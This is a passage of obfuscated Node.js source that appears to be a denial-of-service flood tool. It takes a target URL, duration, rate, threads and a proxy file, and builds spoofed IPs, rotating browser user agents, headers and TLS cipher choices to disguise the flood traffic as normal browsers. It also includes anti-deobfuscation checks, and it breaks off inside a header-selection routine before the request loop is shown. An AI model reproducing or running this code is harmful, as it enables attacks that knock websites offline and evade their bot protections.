const fsxx = require('fs'),
  readline = require('readline'),
  filePath = __filename,
  fileStream = fsxx['createReadStream'](filePath),
  rl = readline['createInterface']({
    'input': fileStream,
    'crlfDelay': Infinity
  });
letfoundObfString = false;
rl['on']('line', OnlyTRis499065 => {
  OnlyTRis499065['includes']('//Obf By NgocUyenCoder') && (foundObfString = true);
}), rl['on']('close', () => {
  if (foundObfString) {} else throw new Error('Fuck Deobf Kiddddd');
});
const fsx = require('fs'),
  scriptPath = __filename,
  scriptContent = fsx['readFileSync'](scriptPath, 'utf-8'),
  lines = scriptContent['split']('\n'),
  numberOfLines = lines['length'];
if (numberOfLines !== 3) throw new Error('Fuck Deobf Kiddddd');
const net = require('net'),
  http2 = require('http2'),
  tls = require('tls'),
  cluster = require('cluster'),
  url = require('url'),
  crypto = require('crypto'),
  fs = require('fs'),
  {
    HeaderGenerator
  } = require('header-generator'),
  errorHandler = OnlyTRis488dd9 => {};
process['on']('uncaughtException', errorHandler), process['on']('unhandledRejection', errorHandler), process['setMaxListeners'](0), require('events')['EventEmitter']['defaultMaxListeners'] = 0, process['on']('uncaughtException', function (OnlyTRis346dcd) {});
process['argv']['length'] < 7 && (console['log']('Usage: target time rate thread proxyfile'), process['exit']());
const headers = {};
function readLines(OnlyTRis5b12b9) {
  return fs['readFileSync'](OnlyTRis5b12b9, 'utf-8')['toString']()['split'](/\r?\n/);
}
function randomIntn(_0x39bdba, OnlyTRis23900a) {
  return Math['floor'](Math['random']() * (OnlyTRis23900a - _0x39bdba) + _0x39bdba);
}
function randomElement(OnlyTRis37fce5) {
  return OnlyTRis37fce5[randomIntn(0, OnlyTRis37fce5['length'])];
}
function randstr(_0x5c174f) {
  const OnlyTRisfffa7b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let _0x1c77cd = '';
  const OnlyTRis44c7e5 = OnlyTRisfffa7b['length'];
  for (let _0x4b08e8 = 0; _0x4b08e8 < _0x5c174f; _0x4b08e8++) {
    _0x1c77cd += OnlyTRisfffa7b['charAt'](Math['floor'](Math['random']() * OnlyTRis44c7e5));
  }
  return _0x1c77cd;
}
const ip_spoof = () => {
    const _0x5996a1 = () => {
      return Math['floor'](Math['random']() * 255);
    };
    return _0x5996a1() + '.' + _0x5996a1() + '.' + _0x5996a1() + '.' + _0x5996a1();
  },
  spoofed = ip_spoof(),
  ip_spoof2 = () => {
    const OnlyTRis10c8a5 = () => {
      return Math['floor'](Math['random']() * 9999);
    };
    return '' + OnlyTRis10c8a5();
  },
  spoofed2 = ip_spoof2(),
  args = {
    'target': process['argv'][2],
    'time': parseInt(process['argv'][3]),
    'Rate': parseInt(process['argv'][4]),
    'threads': parseInt(process['argv'][5]),
    'proxyFile': process['argv'][6]
  };
letheaderGenerator = new HeaderGenerator({
  'browsers': [{
    'name': 'firefox',
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': 'chrome',
    'minVersion': 0x70,
    'httpVersion': '2'
  }],
  'devices': ['mobile', 'desktop'],
  'operatingSystems': ['linux', 'windows', 'macos']
}), randomHeaders = headerGenerator['getHeaders']();
const sig = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'],
  sigalgs1 = sig['join'](':'),
  cplist = ['TLS_AES_128_CCM_8_SHA256', 'TLS_AES_128_CCM_SHA256', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_AES_128_GCM_SHA256', 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384'],
  accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9', 'text/html; charset=utf-8', 'application/json, text/plain, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'];
lang_header = ['ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU', 'en-GB,en-US;q=0.9,en;q=0.8', 'en-GB,en;q=0.5', 'en-CA', 'en-UK, en, de;q=0.5', 'en-NZ', 'en-GB,en;q=0.6', 'en-ZA', 'en-IN', 'en-PH', 'en-SG', 'en-HK', 'en-GB,en;q=0.8', 'en-GB,en;q=0.9', ' en-GB,en;q=0.7', '*', 'en-US,en;q=0.5', 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5', 'utf-8, iso-8859-1;q=0.5, *;q=0.1', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-GB, en-US, en;q=0.9', 'de-AT, de-DE;q=0.9, en;q=0.5', 'cs;q=0.5', 'da, en-gb;q=0.8, en;q=0.7', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'tr', 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'];
const encoding_header = ['*', '*/*', 'gzip', 'gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity', 'gzip, deflate', 'br', 'br;q=1.0, gzip;q=0.8, *;q=0.1', 'gzip;q=1.0, identity; q=0.5, *;q=0', 'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25', 'compress;q=0.5, gzip;q=1.0', 'identity', 'gzip, compress', 'compress, deflate', 'compress', 'gzip, deflate, br', 'deflate', 'gzip, deflate, lzma, sdch', 'deflate'],
  control_header = ['max-age=604800', 'proxy-revalidate', 'public, max-age=0', 'max-age=315360000', 'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800', 's-maxage=604800', 'max-stale', 'public, immutable, max-age=31536000', 'must-revalidate', 'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0', 'max-age=31536000,public,immutable', 'max-age=31536000,public', 'min-fresh', 'private', 'public', 's-maxage', 'no-cache', 'no-cache, no-transform', 'max-age=2592000', 'no-store', 'no-transform', 'max-age=31557600', 'stale-if-error', 'only-if-cached', 'max-age=0'],
  refers = ['https://www.google.com/search?q=', 'https://check-host.net/', 'https://www.facebook.com/', 'https://www.youtube.com/', 'https://www.fbi.com/', 'https://www.bing.com/search?q=', 'https://r.search.yahoo.com/', 'https://www.cia.gov/index.html', 'https://vk.com/profile.php?redirect=', 'https://www.usatoday.com/search/results?q=', 'https://help.baidu.com/searchResult?keywords=', 'https://steamcommunity.com/market/search?q=', 'https://www.ted.com/search?q=', 'https://play.google.com/store/search?q=', 'https://www.qwant.com/search?q=', 'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=', 'https://www.google.ad/search?q=', 'https://www.google.ae/search?q=', 'https://www.google.com.af/search?q=', 'https://www.google.com.ag/search?q=', 'https://www.google.com.ai/search?q=', 'https://www.google.al/search?q=', 'https://www.google.am/search?q=', 'https://www.google.co.ao/search?q=', 'http://anonymouse.org/cgi-bin/anon-www.cgi/', 'http://coccoc.com/search#query=', 'http://ddosvn.somee.com/f5.php?v=', 'http://engadget.search.aol.com/search?q=', 'http://engadget.search.aol.com/search?q=query?=query=&q=', 'http://eu.battle.net/wow/en/search?q=', 'http://filehippo.com/search?q=', 'http://funnymama.com/search?q=', 'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=', 'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/', 'http://go.mail.ru/search?mail.ru=1&q=', 'http://help.baidu.com/searchResult?keywords=', 'http://host-tracker.com/check_page/?furl=', 'http://itch.io/search?q=', 'http://jigsaw.w3.org/css-validator/validator?uri=', 'http://jobs.bloomberg.com/search?q=', 'http://jobs.leidos.com/search?q=', 'http://jobs.rbs.com/jobs/search?q=', 'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=', 'http://louis-ddosvn.rhcloud.com/f5.html?v=', 'http://millercenter.org/search?q=', 'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=', 'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/', 'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=', 'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/', 'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=', 'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=', 'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=', 'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/', 'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q='],
  defaultCiphers = crypto['constants']['defaultCoreCipherList']['split'](':'),
  ciphers1 = 'GREASE:' + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers['slice'](3)]['join'](':'),
  uap = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0'];
platform = ['Linux', 'macOS', 'Windows'], version = ['"Chromium";v="116", "Not)A;Brand";v="8", "Google Chrome";v="116"', '"Chromium";v="115", "Not)A;Brand";v="8", "Google Chrome";v="115"', '"Chromium";v="114", "Not)A;Brand";v="8", "Google Chrome";v="114"', '"Chromium";v="113", "Not)A;Brand";v="8", "Google Chrome";v="113"', '"Chromium";v="112", "Not)A;Brand";v="8", "Google Chrome";v="112"', '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', '"Chromium";v="115", "Not)A;Brand";v="24", "Google Chrome";v="115"', '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"', '"Chromium";v="113", "Not)A;Brand";v="24", "Google Chrome";v="113"', '"Chromium";v="112", "Not)A;Brand";v="24", "Google Chrome";v="112"', '"Chromium";v="116", "Not)A;Brand";v="99", "Google Chrome";v="116"', '"Chromium";v="115", "Not)A;Brand";v="99", "Google Chrome";v="115"', '"Chromium";v="114", "Not)A;Brand";v="99", "Google Chrome";v="114"', '"Chromium";v="113", "Not)A;Brand";v="99", "Google Chrome";v="113"', '"Chromium";v="112", "Not)A;Brand";v="99", "Google Chrome";v="112"'];
const a6 = ['"Chromium";v="116.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="116.0.0.0"', '"Chromium";v="115.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="115.0.0.0"', '"Chromium";v="114.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="114.0.0.0"', '"Chromium";v="113.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="113.0.0.0"', '"Chromium";v="112.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="112.0.0.0"', '"Chromium";v="116.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.0.0"', '"Chromium";v="115.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="115.0.0.0"', '"Chromium";v="114.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="114.0.0.0"', '"Chromium";v="113.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="113.0.0.0"', '"Chromium";v="112.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="112.0.0.0"', '"Chromium";v="116.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="116.0.0.0"', '"Chromium";v="115.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="115.0.0.0"', '"Chromium";v="114.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="114.0.0.0"', '"Chromium";v="113.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="113.0.0.0"', '"Chromium";v="112.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="112.0.0.0"'];
site = ['cross-site', 'same-origin', 'same-site', 'none'], mode = ['cors', 'navigate', 'no-cors', 'same-origin'], dest = ['document', 'image', 'embed', 'empty', 'frame'];
var cipper = cplist[Math['floor'](Math['floor'](Math['random']() * cplist['length']))],
  siga = sig[Math['floor'](Math['floor'](Math['random']() * sig['length']))],
  a = a6[Math['floor'](Math['floor'](Math['random']() * a6['length']))],
  site1 = site[Math['floor'](Math['floor'](Math['random']() * site['length']))],
  mode1 = mode[Math['floor'](Math['floor'](Math['random']() * mode['length']))],
  dest1 = dest[Math['floor'](Math['floor'](Math['random']() * dest['length']))],
  ver = version[Math['floor'](Math['floor'](Math['random']() * version['length']))],
  platforms = platform[Math['floor'](Math['floor'](Math['random']() * platform['length']))],
  uap1 = uap[Math['floor'](Math['floor'](Math['random']() * uap['length']))],
  Ref = refers[Math['floor'](Math['floor'](Math['random']() * refers['length']))],
  accept = accept_header[Math['floor'](Math['floor'](Math['random']() * accept_header['length']))],
  lang = lang_header[Math['floor'](Math['floor'](Math['random']() * lang_header['length']))],
  encoding = encoding_header[Math['floor'](Math['floor'](Math['random']() * encoding_header['length']))],
  control = control_header[Math['floor'](Math['floor'](Math['random']() * control_header['length']))],
  proxies = readLines(args['proxyFile']);
const parsedTarget = url['parse'](args['target']),
  rateHeaders = [{
    'referer': 'https://' + randstr(4) + '.com'
  }, {
    'origin': 'https://' + parsedTarget['path']
  }, {
    'downlink': '1.7'
  }, {
    'viewport-width': '1920'
  }, {
    'width': '1080'
  }, {
    'cookie': randstr(20)
  }, {
    'memory-device': spoofed2
  }],
  rateHeaders2 = [{
    'referer': 'https://' + randstr(4) + '.com'
  }, {
    'origin': 'https://' + parsedTarget['path']
  }, {
    'downlink': '1.7'
  }, {
    'viewport-width': '1920'
  }, {
    'width': '1080'
  }, {
    'cookie': randstr(20)
  }, {
    'memory-device': spoofed2
  }];
function getRandomUserAgent() {
  return uap[Math['floor'](Math['random']() * uap['length'])];
}
let sec1, sec2, sec3, sec4, sec5;
function updateSecValues() {
  var OnlyTRis4da69c = getRandomUserAgent();
  if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36') {
    sec1 = '"Chromium";v="116", " Not A;Brand";v="55", "Google Chrome";v="116"';
    sec2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36';
    sec3 = 'Windows';
    sec4 = '116.0.0.0';
    sec5 = '10.0';
    sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="55.0.0.0", "Google Chrome";v="116.0.0.0"';
    sec7 = 'document';
    sec8 = 'navigate';
    sec9 = 'same-origin';
  } else {
    if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36') {
      sec1 = '" Not;A Brand";v="31", "Google Chrome";v="115", "Chromium";v="115"';
      sec2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36';
      sec3 = 'Windows';
      sec4 = '115.0.0.0';
      sec5 = '10.0';
      sec6 = '" Not;A Brand";v="31.0.0.0", "Google Chrome";v="115.0.0.0", "Chromium";v="115.0.0.0"';
      sec7 = 'document';
      sec8 = 'navigate';
      sec9 = 'same-origin';
    } else {
      if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36') {
        sec1 = '" Not A;Brand";v="21", "Chromium";v="114", "Google Chrome";v="114"';
        sec2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';
        sec3 = 'Windows';
        sec4 = '114.0.0.0';
        sec5 = '10.0';
        sec6 = '" Not;A Brand";v="21.0.0.0", "Google Chrome";v="114.0.0.0", "Chromium";v="114.0.0.0"';
        sec7 = 'document';
        sec8 = 'navigate';
        sec9 = 'same-origin';
      } else {
        if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36') {
          sec1 = '"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="20"';
          sec2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36';
          sec3 = 'Windows';
          sec4 = '113.0.0.0';
          sec5 = '10.0';
          sec6 = '"Google Chrome";v="113.0.0.0", "Chromium";v="113.0.0.0", ";Not A Brand";v="20.0.0.0"';
          sec7 = 'document';
          sec8 = 'navigate';
          sec9 = 'same-origin';
        } else {
          if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36') {
            sec1 = '"Google Chrome";v="112", "Chromium";v="112", ";Not A Brand";v="28"';
            sec2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36';
            sec3 = 'Windows';
            sec4 = '112.0.0.0';
            sec5 = '10.0';
            sec6 = '"Google Chrome";v="112.0.0.0", "Chromium";v="112.0.0.0", ";Not A Brand";v="28.0.0.0"';
            sec7 = 'document';
            sec8 = 'navigate';
            sec9 = 'same-origin';
          } else {
            if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36') {
              sec1 = '"Google Chrome";v="111", "Chromium";v="111", ";Not A Brand";v="22"';
              sec2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36';
              sec3 = 'Windows';
              sec4 = '111.0.0.0';
              sec5 = '10.0';
              sec6 = '"Google Chrome";v="111.0.0.0", "Chromium";v="111.0.0.0", ";Not A Brand";v="22.0.0.0"';
              sec7 = 'document';
              sec8 = 'navigate';
              sec9 = 'same-origin';
            } else {
              if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36') {
                sec1 = '"Google Chrome";v="110", "Chromium";v="110", ";Not A Brand";v="4"';
                sec2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36';
                sec3 = 'Windows';
                sec4 = '110.0.0.0';
                sec5 = '10.0';
                sec6 = '"Google Chrome";v="110.0.0.0", "Chromium";v="110.0.0.0", ";Not A Brand";v="4.0.0.0"';
                sec7 = 'document';
                sec8 = 'navigate';
                sec9 = 'same-origin';
              } else {
                if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36') {
                  sec1 = '"Google Chrome";v="109", "Chromium";v="109", ";Not A Brand";v="1"';
                  sec2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
                  sec3 = 'Windows';
                  sec4 = '109.0.0.0';
                  sec5 = '10.0';
                  sec6 = '"Google Chrome";v="109.0.0.0", "Chromium";v="109.0.0.0", ";Not A Brand";v="1.0.0.0"';
                  sec7 = 'document';
                  sec8 = 'navigate';
                  sec9 = 'same-origin';
                } else {
                  if (OnlyTRis4da69c === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36') {
                    sec1 = '"Google Chrome";v="108", "Chromium";v="108", ";Not A Brand";v="13"';
                    sec2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36';
                    sec3 = 'Windows';
                    sec4 = '108.0.0.0';
                    sec5 = '10.0';
                    sec6 = '"Google Chrome";v="108.0.0.0", "Chromium";v="108.0.0.0", ";Not A Brand";v="13.0.0.0"';
                    sec7 = 'document';
                    sec8 = 'navigate';
                    sec9 = 'same-origin';
                  } else {
                    if (OnlyTRis4da69c === 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36') {
                      sec1 = '"Chromium";v="116", " Not A;Brand";v="75", "Google Chrome";v="116"';
                      sec2 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36';
                      sec3 = 'Linux';
                      sec4 = '116.0.0.0';
                      sec5 = '10.0';
                      sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="75.0.0.0", "Google Chrome";v="116.0.0.0"';
                      sec7 = 'document';
                      sec8 = 'navigate';
                      sec9 = 'same-origin';
                    } else {
                      if (OnlyTRis4da69c === 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36') {
                        sec1 = '" Not;A Brand";v="73", "Google Chrome";v="115", "Chromium";v="115"';
                        sec2 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36';
                        sec3 = 'Linux';
                        sec4 = '115.0.0.0';
                        sec5 = '10.0';
                        sec6 = '" Not;A Brand";v="73.0.0.0", "Google Chrome";v="115.0.0.0", "Chromium";v="115.0.0.0"';
                        sec7 = 'document';
                        sec8 = 'navigate';
                        sec9 = 'same-origin';
                      } else {
                        if (OnlyTRis4da69c === 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36') {
                          sec1 = '" Not;A Brand";v="56", "Google Chrome";v="114", "Chromium";v="114"';
